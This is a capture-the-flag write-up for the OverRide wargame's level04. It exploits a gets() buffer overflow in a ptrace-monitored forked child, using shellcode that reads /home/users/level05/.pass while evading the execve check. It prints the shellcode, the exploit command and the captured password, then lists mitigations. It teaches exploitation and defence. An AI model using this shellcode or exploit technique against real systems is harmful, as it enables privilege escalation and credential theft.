# Level 4 - Buffer Overflow with Fork and Ptrace Protection

## Overview

This level demonstrates a **Buffer Overflow** vulnerability in a process that employs anti-debugging techniques. The program forks into parent and child processes, where the parent monitors the child for suspicious syscalls using `ptrace()`. The child process uses the vulnerable `gets()` function, allowing buffer overflow exploitation. However, the parent detects and kills the child if it attempts to use `execve()`, requiring a custom shellcode that uses `open/read/write` syscalls instead.

## Vulnerability: Improper Restriction of Operations within Bounds [CWE-119](https://cwe.mitre.org/data/definitions/119.html)

### Description

This vulnerability combines several security concepts:

- **Buffer Overflow**: `gets()` function with no bounds checking
- **Process Forking**: Execution split between parent and child processes
- **Ptrace Anti-Debugging**: Parent monitors child for specific syscalls
- **Syscall Filtering**: Parent kills child if `execve` (syscall 0xb) is detected

The `gets()` function is inherently dangerous because:
- No length parameter - reads until newline or EOF
- No bounds checking - can overflow any buffer
- Deprecated in modern C standards for this exact reason

### Key Characteristics

- **Fork-based architecture**: Child handles user input, parent monitors
- **Ptrace monitoring**: Detects syscall 0xb (execve)
- **NX disabled**: Stack is executable (allowing shellcode)
- **No ASLR**: Addresses are predictable
- **Environment variable shellcode**: Can store shellcode outside buffer

## Analysis

### Initial Reconnaissance

```bash
level04@OverRide:~$ ls -la
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
```

The binary runs with `level05` privileges.

### Reverse Engineering

Using GDB to disassemble:

```bash
level04@OverRide:~$ gdb ./level04
(gdb) disas main
```

#### Key Observations

1. **Fork Call** at `+14`:
   ```asm
   0x080486d6 <+14>:   call   0x8048550 <fork@plt>
   0x080486db <+19>:   mov    DWORD PTR [esp+0xac],eax  ; Store child PID
   ```

2. **Child Process Path** (when fork returns 0):
   ```asm
   0x08048709 <+65>:   cmp    DWORD PTR [esp+0xac],0x0  ; Check if child
   0x08048711 <+73>:   jne    0x8048769 <main+161>      ; Jump if parent

   ; Child process code:
   0x08048722 <+90>:   call   0x8048540 <prctl@plt>     ; Enable parent tracing
   0x08048746 <+126>:  call   0x8048570 <ptrace@plt>    ; PTRACE_TRACEME
   0x08048752 <+138>:  call   0x8048500 <puts@plt>      ; Print prompt
   0x0804875e <+150>:  call   0x80484b0 <gets@plt>      ; VULNERABLE!
   ```

3. **Parent Process Monitoring**:
   ```asm
   0x08048769 <+161>:  lea    eax,[esp+0x1c]
   0x08048770 <+168>:  call   0x80484f0 <wait@plt>      ; Wait for child
   0x080487dc <+276>:  call   0x8048570 <ptrace@plt>    ; PTRACE_PEEKUSER
   0x080487e8 <+288>:  cmp    DWORD PTR [esp+0xa8],0xb  ; Check for execve
   0x08048814 <+332>:  call   0x8048520 <kill@plt>      ; Kill if execve detected
   ```

The parent checks register 44 (EAX) which contains the syscall number. If it's `0xb` (execve), the child is killed.

### Debugging with Fork

Since execution happens in a child process, we need special GDB settings:

```bash
(gdb) set follow-fork-mode child
```

This tells GDB to follow the child process after fork.

### Finding the Offset

Using a buffer overflow pattern generator:

```bash
level04@OverRide:~$ gdb ./level04
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 2067]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2067]
0x41326641 in ?? ()
```

Looking up `0x41326641` in the pattern reveals: **Offset = 156 bytes**

### The Ptrace Challenge

Normal shellcode uses `execve` to spawn a shell:
```asm
execve("/bin/sh", NULL, NULL)  ; Syscall 0xb
```

But the parent process detects this and kills the child! We need alternative shellcode that:
1. Opens the password file
2. Reads its contents
3. Writes to stdout

### Shellcode: Open/Read/Write
[https://shell-storm.org/shellcode/files/shellcode-73.html](https://shell-storm.org/shellcode/files/shellcode-73.html)

Using shellcode that performs:
```c
fd = open("/home/users/level05/.pass", O_RDONLY);
while (read(fd, buf, 1) > 0)
    write(STDOUT_FILENO, buf, 1);
```

Shellcode (x86):
```asm
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80
\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01
\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01
\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff
/home/users/level05/.pass
```

Key points:
- Uses syscall 5 (open), 3 (read), 4 (write), 1 (exit)
- No execve (syscall 0xb)
- Path embedded at end of shellcode

## Exploitation

### Step 1: Export Shellcode

```bash
export SHELLCODE=$(python -c 'print("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass")')
```

### Step 2: Find Address

```bash
gcc -m32 getenv.c -o getenv
./getenv SHELLCODE
0xffffd87a
```

**Important**: Must compile with `-m32` to match the 32-bit target binary!

### Step 3: Create Exploit

Build payload:
- 156 bytes padding
- Address of shellcode (little-endian)

```bash
python -c "print('a' * 156 + '\xff\xff\xd8\x7a'[::-1])" | ./level04
```

**Note**: The `[::-1]` reverses the address for little-endian format.

### Execution

```bash
level04@OverRide:~$ python -c "print('a' * 156 + '\xff\xff\xd8\x7a'[::-1])" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```

## Solution

### For Developers - How to Prevent This

1. **NEVER use gets()**:
   ```c
   // VULNERABLE - No bounds checking
   gets(buffer);

   // SAFE - Use fgets with size limit
   fgets(buffer, sizeof(buffer), stdin);
   ```

2. **Enable modern protections**:
   ```bash
   # Compile with stack protection
   gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 source.c

   # Enable NX (non-executable stack)
   gcc -z noexecstack source.c

   # Enable ASLR and PIE
   gcc -fPIE -pie source.c
   ```

3. **Use seccomp for syscall filtering** (proper way):
   ```c
   #include <seccomp.h>

   scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
   seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
   seccomp_load(ctx);
   ```

4. **Input validation**:
   ```c
   // Always validate input length
   if (strlen(input) >= sizeof(buffer)) {
       fprintf(stderr, "Input too long\n");
       return 1;
   }
   ```

5. **Avoid dangerous functions**:
   - `gets()` → Use `fgets()`
   - `strcpy()` → Use `strncpy()` or `strlcpy()`
   - `sprintf()` → Use `snprintf()`
   - `scanf("%s")` → Use `scanf("%99s")` with width limit

6. **Process isolation best practices**:
   - Drop privileges after fork
   - Use proper IPC mechanisms
   - Implement least privilege principle

## Key Takeaways

- `gets()` is fundamentally unsafe and should never be used
- Process forking doesn't prevent buffer overflows
- Ptrace can monitor syscalls but isn't foolproof protection
- Shellcode can be adapted to avoid specific syscalls
- Environment variables can store shellcode when buffer is too small
- Proper syscall filtering requires seccomp or similar frameworks
- Modern compiler protections (stack canaries, NX, ASLR) are essential
- Defense in depth: multiple security layers prevent exploitation

## Password

```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
